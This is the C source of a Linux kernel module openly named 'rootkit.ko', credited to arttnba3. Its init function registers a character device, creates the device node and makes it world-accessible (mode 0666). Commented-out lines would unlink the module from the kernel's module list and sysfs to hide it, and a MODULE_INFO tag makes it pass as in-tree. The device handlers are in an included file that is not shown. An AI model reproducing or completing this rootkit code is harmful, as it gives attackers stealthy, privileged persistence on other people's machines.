/*
* rootkit.ko
* developed by arttnba3
*/
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/device.h>
#include "functions.c"

static int __init rootkit_init(void)
{
    // register device
    major_num = register_chrdev(0, DEVICE_NAME, &a3_rootkit_fo);     // major number 0 for allocated by kernel
    if(major_num < 0)
        return major_num;   // failed
    
    // create device class
    module_class = class_create(THIS_MODULE, CLASS_NAME);
    if(IS_ERR(module_class))
    {
        unregister_chrdev(major_num, DEVICE_NAME);
        return PTR_ERR(module_class);
    }
    
    // create device inode
    module_device = device_create(module_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_NAME);
    if(IS_ERR(module_device))   // failed
    {
        class_destroy(module_class);
        unregister_chrdev(major_num, DEVICE_NAME);
        return PTR_ERR(module_device);
    }

    __file = filp_open(DEVICE_PATH, O_RDONLY, 0);
    if (IS_ERR(__file))			// failed
    {
        device_destroy(module_class, MKDEV(major_num, 0));
        class_destroy(module_class);
        unregister_chrdev(major_num, DEVICE_NAME);
        return PTR_ERR(__file);
    }
    __inode = file_inode(__file);
    __inode->i_mode |= 0666;
    filp_close(__file, NULL);
    
    //struct list_head * list = (&__this_module.list);
	//list->prev->next = list->next;
	//list->next->prev = list->prev;
	
	//kobject_del(&__this_module.mkobj.kobj);
    //list_del(&(&__list_module->mkobj.kobj.entry));//not needed

    return 0;
}

static void __exit rootkit_exit(void)
{
    device_destroy(module_class, MKDEV(major_num, 0));
    class_destroy(module_class);
    unregister_chrdev(major_num, DEVICE_NAME);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("arttnba3");
MODULE_INFO(intree, "Y");
